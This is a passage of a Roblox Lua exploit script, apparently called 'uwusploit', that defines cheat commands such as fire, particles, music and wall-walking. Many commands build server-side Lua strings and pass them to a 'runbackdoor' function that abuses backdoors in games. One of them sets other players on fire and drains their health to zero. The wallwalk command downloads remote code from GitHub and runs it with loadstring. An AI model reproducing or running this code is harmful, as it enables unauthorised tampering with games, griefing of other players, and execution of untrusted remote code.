                    for _, part in pairs(character:GetChildren()) do
                        if part:IsA("BasePart") then
                            for _, existingFire in ipairs(part:GetChildren()) do
                                if existingFire:IsA("Fire") then
                                    existingFire:Destroy()
                                end
                            end
                        end
                    end
                    
                    for _, part in pairs(character:GetChildren()) do
                        if part:IsA("BasePart") then
                            local fire = Instance.new("Fire")
                            fire.Size = 10
                            fire.Heat = 1
                            fire.Color = fyecol
                            fire.SecondaryColor = secfyecol
                            fire.Parent = part
                        end
                    end
                    
                    task.spawn(function()
                        while humanoid and humanoid.Health > 0 and character.Parent do
                            humanoid.Health = humanoid.Health - 20
                            t(0.5)
                        end
                    end)
                end
            end
        ]], localPlayerName)
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            local fyecol = Color3.fromRGB(64, 81, 237)
            local secfyecol = Color3.fromRGB(153, 163, 255)
            
            if player and player.Character then
                local character = player.Character
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                
                if humanoid then
                    for _, part in pairs(character:GetChildren()) do
                        if part:IsA("BasePart") then
                            for _, existingFire in ipairs(part:GetChildren()) do
                                if existingFire:IsA("Fire") then
                                    existingFire:Destroy()
                                end
                            end
                        end
                    end
                    
                    for _, part in pairs(character:GetChildren()) do
                        if part:IsA("BasePart") then
                            local fire = Instance.new("Fire")
                            fire.Size = 10
                            fire.Heat = 1
                            fire.Color = fyecol
                            fire.SecondaryColor = secfyecol
                            fire.Parent = part
                        end
                    end
                    
                    task.spawn(function()
                        while humanoid and humanoid.Health > 0 and character.Parent do
                            humanoid.Health = humanoid.Health - 20
                            t(0.5)
                        end
                    end)
                end
            end
        ]], randomPlayer.Name)
	elseif target == "others" then
		bckd = string.format([[
            local localPlayerName = "%s"
            local fyecol = Color3.fromRGB(64, 81, 237)
            local secfyecol = Color3.fromRGB(153, 163, 255)
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Name ~= localPlayerName then
                    if player and player.Character then
                        local character = player.Character
                        local humanoid = character:FindFirstChildOfClass("Humanoid")
                        
                        if humanoid then
                            for _, part in pairs(character:GetChildren()) do
                                if part:IsA("BasePart") then
                                    for _, existingFire in ipairs(part:GetChildren()) do
                                        if existingFire:IsA("Fire") then
                                            existingFire:Destroy()
                                        end
                                    end
                                end
                            end
                            
                            for _, part in pairs(character:GetChildren()) do
                                if part:IsA("BasePart") then
                                    local fire = Instance.new("Fire")
                                    fire.Size = 10
                                    fire.Heat = 1
                                    fire.Color = fyecol
                                    fire.SecondaryColor = secfyecol
                                    fire.Parent = part
                                end
                            end
                            
                            task.spawn(function()
                                while humanoid and humanoid.Health > 0 and character.Parent do
                                    humanoid.Health = humanoid.Health - 20
                                    t(0.5)
                                end
                            end)
                        end
                    end
                end
            end
        ]], localPlayerName)
	elseif target == "all" then
		bckd = [[
            local fyecol = Color3.fromRGB(64, 81, 237)
            local secfyecol = Color3.fromRGB(153, 163, 255)
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player and player.Character then
                    local character = player.Character
                    local humanoid = character:FindFirstChildOfClass("Humanoid")
                    
                    if humanoid then
                        for _, part in pairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                for _, existingFire in ipairs(part:GetChildren()) do
                                    if existingFire:IsA("Fire") then
                                        existingFire:Destroy()
                                    end
                                end
                            end
                        end
                        
                        for _, part in pairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                local fire = Instance.new("Fire")
                                fire.Size = 10
                                fire.Heat = 1
                                fire.Color = fyecol
                                fire.SecondaryColor = secfyecol
                                fire.Parent = part
                            end
                        end
                        
                        task.spawn(function()
                            while humanoid and humanoid.Health > 0 and character.Parent do
                                humanoid.Health = humanoid.Health - 20
                                t(0.5)
                            end
                        end)
                    end
                end
            end
        ]]
	else
		bckd = string.format([[
            local targetName = "%s"
            local fyecol = Color3.fromRGB(64, 81, 237)
            local secfyecol = Color3.fromRGB(153, 163, 255)
            
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if string.find(string.lower(player.Name), string.lower(targetName)) then
                    if player and player.Character then
                        local character = player.Character
                        local humanoid = character:FindFirstChildOfClass("Humanoid")
                        
                        if humanoid then
                            for _, part in pairs(character:GetChildren()) do
                                if part:IsA("BasePart") then
                                    for _, existingFire in ipairs(part:GetChildren()) do
                                        if existingFire:IsA("Fire") then
                                            existingFire:Destroy()
                                        end
                                    end
                                end
                            end
                            
                            for _, part in pairs(character:GetChildren()) do
                                if part:IsA("BasePart") then
                                    local fire = Instance.new("Fire")
                                    fire.Size = 10
                                    fire.Heat = 1
                                    fire.Color = fyecol
                                    fire.SecondaryColor = secfyecol
                                    fire.Parent = part
                                end
                            end
                            
                            task.spawn(function()
                                while humanoid and humanoid.Health > 0 and character.Parent do
                                    humanoid.Health = humanoid.Health - 20
                                    t(0.5)
                                end
                            end)
                        end
                    end
                end
            end
        ]], target)
	end

	if bckd ~= "" then
		runbackdoor(backdoor, bckd)
	end
end)

--------------------------------------------------------------------------------------------------------------

addcommand("dynamic9007", "dyn9007", function()
	local emotionController = {}

	local emotions = {
		angry = "rbxassetid://114905525024059",
		neutral = "rbxassetid://16116369076",
		blink = "rbxassetid://140719110059829"
	}

	local speaktxt = {
		angry = "rbxassetid://120009922945165",
		neutral = "rbxassetid://124616696573508",
		blink = "rbxassetid://110245971364225"
	}

	local currentEmotion = "angry"
	local isResting = false
	local isBlinking = true
	local isSpeaking = false
	local running = true
	local backdoorMode = false
	local pointLight = nil
	local localAccessory = nil
	local blinkThread = nil
	local speakThread = nil

	local function fullCleanup()
		running = false

		if blinkThread then
			coroutine.close(blinkThread)
			blinkThread = nil
		end

		if speakThread then
			coroutine.close(speakThread)
			speakThread = nil
		end

		if pointLight then
			pointLight:Destroy()
			pointLight = nil
		end
	end

	local function runEmotionSystem()
		fullCleanup()
		running = true
		backdoorMode = false

		local Players = game:GetService("Players")
		local player = Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()

		local function setupAccessory(char)
			for _, accessory in ipairs(char:GetChildren()) do
				if accessory:IsA("Accessory") and 
					(accessory.Name:lower():find("hi chat") or accessory.Name:lower():find("9007")) then
					local handle = accessory:FindFirstChild("Handle")
					if handle then
						if not handle:FindFirstChild("EmotionLight") then
							pointLight = Instance.new("PointLight")
							pointLight.Name = "EmotionLight"
							pointLight.Brightness = 3
							pointLight.Range = 20
							pointLight.Color = Color3.fromHex("#3244ed")
							pointLight.Parent = handle
						end
						localAccessory = accessory
						return accessory
					end
				end
			end
			return nil
		end

		function emotionController.updateTexture(textureId)
			local accessory = setupAccessory(character)
			if not accessory then return end

			local handle = accessory:FindFirstChild("Handle")
			if not handle then return end

			local mesh = handle:FindFirstChildOfClass("SpecialMesh")
			if mesh then
				mesh.TextureId = textureId
			end

			if pointLight then
				pointLight.Color = Color3.fromHex("#3244ed")
			end
		end

		player.CharacterAdded:Connect(function(newChar)
			if not running then return end
			character = newChar
			pointLight = nil
			localAccessory = nil
			emotionController.updateTexture(emotions[currentEmotion])
		end)

		blinkThread = task.spawn(function()
			while running do
				if not isResting and isBlinking and not isSpeaking then
					local waitTime = math.random(3, 5)
					local startTime = os.clock()

					while os.clock() - startTime < waitTime and running do
						t(0.1)
					end

					if running then
						emotionController.updateTexture(emotions["blink"])
						t(0.1)
						emotionController.updateTexture(emotions[currentEmotion])
					end
				else
					t(0.1)
				end
			end
		end)

		speakThread = task.spawn(function()
			while running do
				if isSpeaking then
					local emotion = isResting and "blink" or currentEmotion
					if speaktxt[emotion] then
						emotionController.updateTexture(speaktxt[emotion])
						t(0.1)
						emotionController.updateTexture(emotions[emotion])
						t(0.1)
					end
				else
					t(0.1)
				end
			end
		end)

		emotionController.updateTexture(emotions[currentEmotion])
	end

	local function runBackdoorVersion()
		fullCleanup()
		backdoorMode = true
		currentEmotion = "angry"

		local scriptToRun = [[
        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")
        local emotions = {
        	angry = "rbxassetid://114905525024059",
        	neutral = "rbxassetid://16116369076",
        	blink = "rbxassetid://140719110059829"
        }

        local speaktxt = {
        	angry = "rbxassetid://120009922945165",
        	neutral = "rbxassetid://124616696573508",
        	blink = "rbxassetid://110245971364225"
        }
        
        local currentEmotion = "angry"
        local isResting = false
        local isBlinking = true
        local isSpeaking = false
        local running = true
        
        local activeLights = {}
        local characterConnections = {}
        
        local function applyToCharacter(character)
            for _, accessory in ipairs(character:GetChildren()) do
                if accessory:IsA("Accessory") and 
                   (accessory.Name:lower():find("hi chat") or accessory.Name:lower():find("9007")) then
                    local handle = accessory:FindFirstChild("Handle")
                    if handle then
                        local mesh = handle:FindFirstChildOfClass("SpecialMesh")
                        if mesh then
                            mesh.TextureId = emotions[currentEmotion]
                        end
                        
                        if not activeLights[handle] then
                            local light = Instance.new("PointLight")
                            light.Name = "EmotionLight"
                            light.Brightness = 3
                            light.Range = 20
                            light.Color = Color3.fromHex("#3244ed")
                            light.Parent = handle
                            activeLights[handle] = light
                            
                            handle.AncestryChanged:Connect(function(_, parent)
                                if not parent then
                                    if activeLights[handle] then
                                        activeLights[handle]:Destroy()
                                        activeLights[handle] = nil
                                    end
                                end
                            end)
                        end
                    end
                end
            end
        end
        
        for _, player in pairs(Players:GetPlayers()) do
            characterConnections[player] = player.CharacterAdded:Connect(function(character)
                if running then
                    applyToCharacter(character)
                end
            end)
            
            if player.Character then
                applyToCharacter(player.Character)
            end
        end
        
        local function updateAll(textureId)
            for _, player in pairs(Players:GetPlayers()) do
                if player.Character then
                    for _, accessory in ipairs(player.Character:GetChildren()) do
                        if accessory:IsA("Accessory") and 
                           (accessory.Name:lower():find("hi chat") or accessory.Name:lower():find("9007")) then
                            local handle = accessory:FindFirstChild("Handle")
                            if handle then
                                local mesh = handle:FindFirstChildOfClass("SpecialMesh")
                                if mesh then
                                    mesh.TextureId = textureId
                                end
                                
                                if activeLights[handle] then
                                    activeLights[handle].Color = Color3.fromHex("#3244ed")
                                end
                            end
                        end
                    end
                end
            end
        end
        
        local blinkCoroutine = coroutine.create(function()
            while running do
                if not isResting and isBlinking and not isSpeaking then
                    local waitTime = math.random(3, 5)
                    local startTime = os.clock()
                    
                    while os.clock() - startTime < waitTime and running do
                        RunService.Heartbeat:Wait()
                    end
                    
                    if running then
                        updateAll(emotions["blink"])
                        t(0.1)
                        updateAll(emotions[currentEmotion])
                    end
                else
                    t(0.1)
                end
            end
        end)
        
        local speakCoroutine = coroutine.create(function()
            while running do
                if isSpeaking then
                    local emotion = isResting and "blink" or currentEmotion
                    if speaktxt[emotion] then
                        updateAll(speaktxt[emotion])
                        t(0.1)
                        updateAll(emotions[emotion])
                        t(0.1)
                    end
                else
                    t(0.1)
                end
            end
        end)
        
        coroutine.resume(blinkCoroutine)
        coroutine.resume(speakCoroutine)
        
        return function()
            running = false
            if blinkCoroutine then
                coroutine.close(blinkCoroutine)
            end
            if speakCoroutine then
                coroutine.close(speakCoroutine)
            end
            for player, connection in pairs(characterConnections) do
                connection:Disconnect()
            end
            for handle, light in pairs(activeLights) do
                if light then
                    light:Destroy()
                end
            end
            activeLights = {}
            characterConnections = {}
        end
    ]]

		local cleanupFunc = runbackdoor(backdoor, scriptToRun)

		emotionController.cleanupBackdoor = cleanupFunc
	end

	if backdoor then
		runBackdoorVersion()
	else
		runEmotionSystem()
	end

	if not backdoorMode then
		local backdoorConnection
		backdoorConnection = game:GetService("RunService").Heartbeat:Connect(function()
			if backdoor and not backdoorMode then
				backdoorConnection:Disconnect()
				runBackdoorVersion()
			end
		end)
	end

	return emotionController
end)

--------------------------------------------------------------------------------------------------------------

antifling = nil

addcommand("antifling", "afling", function()
	if antifling then
		antifling:Disconnect()
		antifling = nil
	end
	antifling = uwu["run service"].Heartbeat:Connect(function()
		for _, player in pairs(uwu["players"]:GetPlayers()) do
			if player ~= uwu["local player"] and player.Character then
				for _, v in pairs(player.Character:GetDescendants()) do
					if v:IsA("BasePart") then
						v.CanCollide = false
					end
				end
			end
		end
	end)
end)

addcommand("unantifling", "unafling", function()
	if antifling then
		antifling:Disconnect()
		antifling = nil
	end
end)

--------------------------------------------------------------------------------------------------------------

addcommand("walkonwalls", "wallwalk", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/wallwalker.lua"))()
end)

--------------------------------------------------------------------------------------------------------------

addcommand("particle", "particle", function(target, imageId)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	local function tortso(character)
		return character:FindFirstChild("Torso") or 
			character:FindFirstChild("UpperTorso") or
			character:FindFirstChild("HumanoidRootPart")
	end

	local function addpcl(player)
		if player and player.Character then
			local torso = tortso(player.Character)
			if torso then
				for _, child in ipairs(torso:GetChildren()) do
					if child:IsA("ParticleEmitter") then
						child:Destroy()
					end
				end

				local pe = Instance.new("ParticleEmitter")
				pe.Texture = "rbxassetid://" .. imageId
				pe.VelocitySpread = 0
				pe.Parent = torso
				pe.SpreadAngle = Vector2.new(0, 0)
				pe.Acceleration = Vector3.new(0, 0, 0)

				local se = Instance.new("ParticleEmitter")
				se.Texture = "rbxassetid://" .. imageId
				se.VelocitySpread = 0
				se.Parent = torso
				pe.SpreadAngle = Vector2.new(0, 0)
				pe.Acceleration = Vector3.new(0, 0, 0)

				local fe = Instance.new("ParticleEmitter")
				fe.Texture = "rbxassetid://" .. imageId
				fe.VelocitySpread = 0
				fe.Parent = torso
				pe.SpreadAngle = Vector2.new(0, 0)
				pe.Acceleration = Vector3.new(0, 0, 0)
			end
		end
	end

	if not backdoor then
		if not target or target == "" or target == "me" then
			addpcl(localPlayer)
		elseif target == "random" then
			if #players > 0 then
				addpcl(players[math.random(1, #players)])
			end
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					task.spawn(function() addpcl(player) end)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				task.spawn(function() addpcl(player) end)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					addpcl(player)
					break
				end
			end
		end
	else
		local bckd

		if not target or target == "" or target == "me" then
			bckd = string.format([[
                local player = game:GetService("Players"):FindFirstChild("%s")
                if player and player.Character then
                    local torso = player.Character:FindFirstChild("Torso") or 
                                 player.Character:FindFirstChild("UpperTorso") or
                                 player.Character:FindFirstChild("HumanoidRootPart")
                    if torso then
                        for _, child in ipairs(torso:GetChildren()) do
                            if child:IsA("ParticleEmitter") then
                                child:Destroy()
                            end
                        end

                        local pe = Instance.new("ParticleEmitter")
                        pe.Texture = "rbxassetid://%d"
                        pe.VelocitySpread = 50
                        pe.Parent = torso

                        local se = Instance.new("ParticleEmitter")
                        se.Texture = "rbxassetid://%d"
                        se.VelocitySpread = 50
                        se.Parent = torso

                        local fe = Instance.new("ParticleEmitter")
                        fe.Texture = "rbxassetid://%d"
                        fe.VelocitySpread = 50
                        fe.Parent = torso
                    end
                end
            ]], localPlayer.Name, imageId, imageId, imageId)
		elseif target == "random" then
			if #players > 0 then
				local randomPlayer = players[math.random(1, #players)]
				bckd = string.format([[
                    local player = game:GetService("Players"):FindFirstChild("%s")
                    if player and player.Character then
                        local torso = player.Character:FindFirstChild("Torso") or 
                                     player.Character:FindFirstChild("UpperTorso") or
                                     player.Character:FindFirstChild("HumanoidRootPart")
                        if torso then
                            for _, child in ipairs(torso:GetChildren()) do
                                if child:IsA("ParticleEmitter") then
                                    child:Destroy()
                                end
                            end

                            local pe = Instance.new("ParticleEmitter")
                            pe.Texture = "rbxassetid://%d"
                            pe.VelocitySpread = 50
                            pe.Parent = torso

                            local se = Instance.new("ParticleEmitter")
                            se.Texture = "rbxassetid://%d"
                            se.VelocitySpread = 50
                            se.Parent = torso

                            local fe = Instance.new("ParticleEmitter")
                            fe.Texture = "rbxassetid://%d"
                            fe.VelocitySpread = 50
                            fe.Parent = torso
                        end
                    end
                ]], randomPlayer.Name, imageId, imageId, imageId)
			end
		elseif target == "others" then
			bckd = string.format([[
                local localPlayer = game:GetService("Players"):FindFirstChild("%s")
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= localPlayer and player.Character then
                        local torso = player.Character:FindFirstChild("Torso") or 
                                     player.Character:FindFirstChild("UpperTorso") or
                                     player.Character:FindFirstChild("HumanoidRootPart")
                        if torso then
                            for _, child in ipairs(torso:GetChildren()) do
                                if child:IsA("ParticleEmitter") then
                                    child:Destroy()
                                end
                            end

                            local pe = Instance.new("ParticleEmitter")
                            pe.Texture = "rbxassetid://%d"
                            pe.VelocitySpread = 50
                            pe.Parent = torso

                            local se = Instance.new("ParticleEmitter")
                            se.Texture = "rbxassetid://%d"
                            se.VelocitySpread = 50
                            se.Parent = torso

                            local fe = Instance.new("ParticleEmitter")
                            fe.Texture = "rbxassetid://%d"
                            fe.VelocitySpread = 50
                            fe.Parent = torso
                        end
                    end
                end
            ]], localPlayer.Name, imageId, imageId, imageId)
		elseif target == "all" then
			bckd = string.format([[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player.Character then
                        local torso = player.Character:FindFirstChild("Torso") or 
                                     player.Character:FindFirstChild("UpperTorso") or
                                     player.Character:FindFirstChild("HumanoidRootPart")
                        if torso then
                            for _, child in ipairs(torso:GetChildren()) do
                                if child:IsA("ParticleEmitter") then
                                    child:Destroy()
                                end
                            end

                            local pe = Instance.new("ParticleEmitter")
                            pe.Texture = "rbxassetid://%d"
                            pe.VelocitySpread = 50
                            pe.Parent = torso

                            local se = Instance.new("ParticleEmitter")
                            se.Texture = "rbxassetid://%d"
                            se.VelocitySpread = 50
                            se.Parent = torso

                            local fe = Instance.new("ParticleEmitter")
                            fe.Texture = "rbxassetid://%d"
                            fe.VelocitySpread = 50
                            fe.Parent = torso
                        end
                    end
                end
            ]], imageId, imageId, imageId)
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					bckd = string.format([[
                        local player = game:GetService("Players"):FindFirstChild("%s")
                        if player and player.Character then
                            local torso = player.Character:FindFirstChild("Torso") or 
                                         player.Character:FindFirstChild("UpperTorso") or
                                         player.Character:FindFirstChild("HumanoidRootPart")
                            if torso then
                                for _, child in ipairs(torso:GetChildren()) do
                                    if child:IsA("ParticleEmitter") then
                                        child:Destroy()
                                    end
                                end

                                local pe = Instance.new("ParticleEmitter")
                                pe.Texture = "rbxassetid://%d"
                                pe.VelocitySpread = 50
                                pe.Parent = torso

                                local se = Instance.new("ParticleEmitter")
                                se.Texture = "rbxassetid://%d"
                                se.VelocitySpread = 50
                                se.Parent = torso

                                local fe = Instance.new("ParticleEmitter")
                                fe.Texture = "rbxassetid://%d"
                                fe.VelocitySpread = 50
                                fe.Parent = torso
                            end
                        end
                    ]], player.Name, imageId, imageId, imageId)
					break
				end
			end
		end

		if bckd then
			runbackdoor(backdoor, bckd)
		end
	end
end)

addcommand("unparticle", "unparticle", function(target)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	local function tortso(character)
		return character:FindFirstChild("Torso") or 
			character:FindFirstChild("UpperTorso") or
			character:FindFirstFirstChild("HumanoidRootPart")
	end

	local function removpcl(player)
		if player and player.Character then
			local torso = tortso(player.Character)
			if torso then
				for _, child in ipairs(torso:GetChildren()) do
					if child:IsA("ParticleEmitter") then
						child:Destroy()
					end
				end
			end
		end
	end

	if not backdoor then
		if not target or target == "" or target == "me" then
			removpcl(localPlayer)
		elseif target == "random" then
			if #players > 0 then
				removpcl(players[math.random(1, #players)])
			end
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					task.spawn(function() removpcl(player) end)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				task.spawn(function() removpcl(player) end)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					removpcl(player)
					break
				end
			end
		end
	else
		local bckd

		if not target or target == "" or target == "me" then
			bckd = string.format([[
                local player = game:GetService("Players"):FindFirstChild("%s")
                if player and player.Character then
                    local torso = player.Character:FindFirstChild("Torso") or 
                                 player.Character:FindFirstChild("UpperTorso") or
                                 player.Character:FindFirstChild("HumanoidRootPart")
                    if torso then
                        for _, child in ipairs(torso:GetChildren()) do
                            if child:IsA("ParticleEmitter") then
                                child:Destroy()
                            end
                        end
                    end
                end
            ]], localPlayer.Name)
		elseif target == "random" then
			if #players > 0 then
				local randomPlayer = players[math.random(1, #players)]
				bckd = string.format([[
                    local player = game:GetService("Players"):FindFirstChild("%s")
                    if player and player.Character then
                        local torso = player.Character:FindFirstChild("Torso") or 
                                     player.Character:FindFirstChild("UpperTorso") or
                                     player.Character:FindFirstChild("HumanoidRootPart")
                        if torso then
                            for _, child in ipairs(torso:GetChildren()) do
                                if child:IsA("ParticleEmitter") then
                                    child:Destroy()
                                end
                            end
                        end
                    end
                ]], randomPlayer.Name)
			end
		elseif target == "others" then
			bckd = string.format([[
                local localPlayer = game:GetService("Players"):FindFirstChild("%s")
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player ~= localPlayer and player.Character then
                        local torso = player.Character:FindFirstChild("Torso") or 
                                     player.Character:FindFirstChild("UpperTorso") or
                                     player.Character:FindFirstChild("HumanoidRootPart")
                        if torso then
                            for _, child in ipairs(torso:GetChildren()) do
                                if child:IsA("ParticleEmitter") then
                                    child:Destroy()
                                end
                            end
                        end
                    end
                end
            ]], localPlayer.Name)
		elseif target == "all" then
			bckd = [[
                for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                    if player.Character then
                        local torso = player.Character:FindFirstChild("Torso") or 
                                     player.Character:FindFirstChild("UpperTorso") or
                                     player.Character:FindFirstChild("HumanoidRootPart")
                        if torso then
                            for _, child in ipairs(torso:GetChildren()) do
                                if child:IsA("ParticleEmitter") then
                                    child:Destroy()
                                end
                            end
                        end
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					bckd = string.format([[
                        local player = game:GetService("Players"):FindFirstChild("%s")
                        if player and player.Character then
                            local torso = player.Character:FindFirstChild("Torso") or 
                                         player.Character:FindFirstChild("UpperTorso") or
                                         player.Character:FindFirstChild("HumanoidRootPart")
                            if torso then
                                for _, child in ipairs(torso:GetChildren()) do
                                    if child:IsA("ParticleEmitter") then
                                        child:Destroy()
                                    end
                                end
                            end
                        end
                    ]], player.Name)
					break
				end
			end
		end

		if bckd then
			runbackdoor(backdoor, bckd)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

currentMusic = nil

addcommand("music", "music", function(soundId)
	if workspace:FindFirstChild("uwumusic") then
		workspace.uwumusic:Destroy()
	end

	local folderPath = "uwusploit"
	local subfolderPath = folderPath .. "/external music"

	-- Ensure folders exist
	if not isfolder(folderPath) then makefolder(folderPath) end
	if not isfolder(subfolderPath) then makefolder(subfolderPath) end

	local bckd = [[
		if not game:GetService("Workspace"):FindFirstChild("uwumusic") then
			local sound = Instance.new("Sound")
			sound.SoundId = "rbxassetid://%soundId%"
			sound.Looped = true
			sound.Volume = 1
			sound.Parent = game.Workspace
			sound.Name = "uwumusic"
			sound:Play()
		end
	]]

	if not backdoor then
		local soundMap = {
			["198748194766299"] = {file = "migas.mp3", url = "https://pomf2.lain.la/f/1hqwely5.mp3"},
			["193462927464828"] = {file = "krug.mp3", url = "https://pomf2.lain.la/f/h6bv2p1n.mp3"},
			["957262475728274"] = {file = "dokidi.mp3", url = "https://pomf2.lain.la/f/m5idnnmt.mp3"},
			["1737483827468439"] = {file = "pressed.mp3", url = "https://pomf2.lain.la/f/e0hezuqo.mp3"},
			["183646282846472"] = {file = "zerotwo.mp3", url = "https://files.catbox.moe/6hl3jc.mp3"},
			["18364627264728"] = {file = "tacaxe.mp3", url = "https://pomf2.lain.la/f/lqaxx025.mp3"},
			["1837471837748471"] = {file = "renichtinersperado.mp3", url = "https://pomf2.lain.la/f/e1edapxe.mp3"},
			["196634818253957"] = {file = "vanished.mp3", url = "https://pomf2.lain.la/f/cf4z5gwk.mp3"},
			["1129483289284747"] = {file = "headlockjersy.mp3", url = "https://pomf2.lain.la/f/97xouvpl.mp3"},
			["1846418173638182"] = {file = "nohands.mp3", url = "https://pomf2.lain.la/f/btacyzaa.mp3"},
			["1538163717465828"] = {file = "taco.mp3", url = "https://pomf2.lain.la/f/bjrbtx0.mp3"},
			["193747197374837164"] = {file = "basbas.mp3", url = "https://pomf2.lain.la/f/gvub4ow7.mp3"},
			["19374728438288577"] = {file = "climalindo.mp3", url = "https://pomf2.lain.la/f/2z9s751.mp3"},
			["194728274626264857"] = {file = "angelical.mp3", url = "https://pomf2.lain.la/f/n3ih2zia.mp3"},
			["3727154382186353"] = {file = "fragment.mp3", url = "https://pomf2.lain.la/f/8vrhzyia.mp3"},
			["18246618364758572"] = {file = "jumpstyle.mp3", url = "https://files.catbox.moe/byyj8g.mp3"},
			["1937462828462817367"] = {file = "elajoga.mp3", url = "https://pomf2.lain.la/f/63qpt243.mp3"},
			["194728264781726473"] = {file = "bailedecoq.mp3", url = "https://pomf2.lain.la/f/49twlnnj.mp3"},
			["19374822837282737"] = {file = "pianotiles.mp3", url = "https://pomf2.lain.la/f/kxqg58t.mp3"},
			["18462827466282645"] = {file = "automotivorally.mp3", url = "https://pomf2.lain.la/f/mllrnyln.mp3"},
			["19472625184582173"] = {file = "hunniddolla.mp3", url = "https://pomf2.lain.la/f/ow5a6ze4.mp3"},
			["18367181637284636"] = {file = "mexiloestranhojumpstyle.mp3", url = "https://files.catbox.moe/583ny0.mp3"},
			["18367264627385726"] = {file = "estrelahelix.mp3", url = "https://files.catbox.moe/bk1ail.mp3"},
			["184738292625371357"] = {file = "hypnosaes.mp3", url = "https://files.catbox.moe/v0htkf.mp3"},
			["400004444044044"] = {file = "wutiwant.mp3", url = "https://pomf2.lain.la/f/feuyk3nj.mp3"},
			["04440404404040440"] = {file = "reality.mp3", url = "https://files.catbox.moe/uzgc8x.mp3"},
			["18462937481827373"] = {file = "crowsong.mp3", url = "https://files.catbox.moe/63ixlc.mp3"},
			["21937418364728284"] = {file = "baddobad.mp3", url = "https://files.catbox.moe/4lxzy3.mp3"},
			["1947472828477282"] = {file = "voltar.mp3", url = "https://files.catbox.moe/obgcg4.mp3"},
			["1947282747182747"] = {file = "lbfunk.mp3", url = "https://files.catbox.moe/thoo1v.mp3"},
			["1636291836383658"] = {file = "onlyfans.mp3", url = "https://files.catbox.moe/e0skbl.mp3"},
			["193648262648483626"] = {file = "felicidade.mp3", url = "https://files.catbox.moe/j0y274.mp3"},
			["2847278264727"] = {file = "bloodpop.mp3", url = "https://files.catbox.moe/jhc0te.mp3"},
			["388272473827264"] = {file = "trablabla.mp3", url = "https://files.catbox.moe/2fm2ds.mp3"},
			["1948276163758582"] = {file = "letsgag.mp3", url = "https://files.catbox.moe/5wglww.mp3"},
			["2351874728164"] = {file = "elevatorfunk.mp3", url = "https://files.catbox.moe/sjrxnh.mp3"},
			["10374729384729"] = {file = "succao.mp3", url = "https://files.catbox.moe/l8ng77.mp3"},
			["29474729374792"] = {file = "lunarrally.mp3", url = "https://files.catbox.moe/w4lubq.mp3"},
			["2481818374839183"] = {file = "nova.mp3", url = "https://files.catbox.moe/i4snzk.mp3"},
			["1937472828744"] = {file = "fenixritmada.mp3", url = "https://pomf2.lain.la/f/h2l0l1l.mp3"},
			["192746282847987"] = {file = "foreign.mp3", url = "https://pomf2.lain.la/f/dhlcm9sd.mp3"},
			["1249827348923757"] = {file = "amioverreacting.mp3", url = "https://files.catbox.moe/omvmbi.mp3"},
			["194747292744928"] = {file = "igeeks.mp3", url = "https://pomf2.lain.la/f/3zvza64.mp3"},
			["194738173649281648"] = {file = "donthide.mp3", url = "https://files.catbox.moe/b7984q.mp3"},
			["19273467227737474"] = {file = "mdh3.mp3", url = "https://files.catbox.moe/zoclak.mp3"},
			["102846817375927"] = {file = "hazy.mp3", url = "https://files.catbox.moe/j8x2pr.mp3"},
		}

		local soundInfo = soundMap[soundId]
		if soundInfo then
			task.spawn(function()
				unablenotify("wait a moment.")
				local fullPath = subfolderPath .. "/" .. soundInfo.file

				if not isfile(fullPath) then
					writefile(fullPath, game:HttpGet(soundInfo.url))
				end

				local s = Instance.new("Sound")
				s.Name = "uwumusic"
				s.Looped = true
				s.Volume = 1
				s.SoundId = getcustomasset(fullPath)
				s.Parent = workspace
				s:Play()
				currentMusic = s
			end)
		else
			local fallback = Instance.new("Sound")
			fallback.Name = "uwumusic"
			fallback.SoundId = "rbxassetid://" .. soundId
			fallback.Looped = true
			fallback.Volume = 1
			fallback.Parent = workspace
			fallback:Play()
			currentMusic = fallback
		end
	else
		bckd = bckd:gsub("%%soundId%%", soundId)
		runbackdoor(backdoor, bckd)
	end
end)

addcommand("volume", "volume", function(volume)
	local bckd
	bckd = [[
        local sound = game.Workspace:FindFirstChild("uwumusic")
        if sound then
            sound.Volume = %volume%
        end
    ]]

	if not backdoor then
		localPlayer = game.Players.LocalPlayer
		if localPlayer then
			if currentMusic then
				currentMusic.Volume = volume
			end
		end
	else
		bckd = bckd:gsub("%%volume%%", volume)

		runbackdoor(backdoor, bckd)
	end
end)

addcommand("pitch", "pitch", function(pitch)
	local bckd
	bckd = [[
        local sound = game.Workspace:FindFirstChild("uwmusic")
        if sound then
            sound.Pitch = %pitch%
        end
    ]]

	if not backdoor then
		localPlayer = game.Players.LocalPlayer
		if localPlayer then
			if currentMusic then
				currentMusic.Pitch = pitch
			end
		end
	else
		bckd = bckd:gsub("%%pitch%%", pitch)

		runbackdoor(backdoor, bckd)
	end
end)

addcommand("unmusic", "unmusic", function()
	local bckd
	bckd = [[
        local sound = game.Workspace:FindFirstChild("uwumusic")
        if sound then
            sound:Destroy()
